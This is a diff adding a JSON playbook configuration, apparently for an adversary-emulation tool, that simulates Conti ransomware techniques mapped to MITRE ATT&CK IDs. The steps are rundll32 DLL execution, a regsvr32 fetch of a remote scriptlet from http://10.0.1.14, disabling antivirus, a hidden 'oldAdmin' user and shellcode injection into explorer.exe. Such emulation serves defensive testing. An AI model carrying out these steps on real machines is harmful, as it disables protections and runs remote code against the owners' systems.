@@ -1,0 +1,53 @@
+{
+  "type": "local",
+  "sleep": 5,
+  "playbooks": [
+    {
+      "name": "Conti Ransomware Emulation - Executing code with LOLBAS",
+      "enabled": true,
+      "task_sleep": 3,
+      "tasks": [
+        {
+          "technique_id": "T1218.011",
+          "technique_name": "System Binary Proxy Execution: Rundll32",
+          "dllPath": "C:\\Users\\bla\\Appdata\\Local\\Temp\\7A86.dll",
+          "exportName": "DllRegisterServer"
+        },
+        {
+          "technique_id": "T1218.010",
+          "technique_name": "System Binary Proxy Execution: Regsvr32",
+          "url": "http://10.0.1.14/file.sct",
+          "dllPath": "scrobj.dll"
+        }
+      ]
+    },
+    {
+      "name": "Conti Ransomware Emulation - Disable AV",
+      "enabled": true,
+      "task_sleep": 3,
+      "tasks": [
+        {
+          "technique_id":"T1562.001",
+          "technique_name": "Impair Defenses: Disable or Modify Tools"
+        },
+        {
+          "technique_id": "T1564.002",
+          "technique_name": "Hide Artifacts: Hidden Users",
+          "user": "oldAdmin"
+        }
+      ]
+    },
+    {
+      "name": "Conti Ransomware Emulation - Inject shellcode to explorer.exe ",
+      "enabled": true,
+      "task_sleep": 3,
+      "tasks": [
+        {
+          "technique_id": "T1055.002",
+          "technique_name": "Process Injection: Portable Executable Injection",
+          "process_name": "explorer"
+        }
+      ]
+    }
+  ]
+}
